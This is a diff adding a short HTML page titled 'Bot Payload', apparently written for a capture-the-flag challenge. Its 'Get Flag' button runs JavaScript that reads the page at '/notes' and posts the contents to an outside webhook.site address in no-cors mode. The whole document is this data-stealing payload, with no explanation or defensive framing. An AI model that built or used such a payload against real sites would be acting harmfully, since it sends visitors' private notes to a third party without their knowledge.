@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <h1>Bot Payload</h1>
+    <button id="installbutton" onclick="
+      fetch('/notes')
+        .then(r => r.text())
+        .then(f => fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: f
+        }));
+    ">Get Flag</button>
+  </body>
+</html>
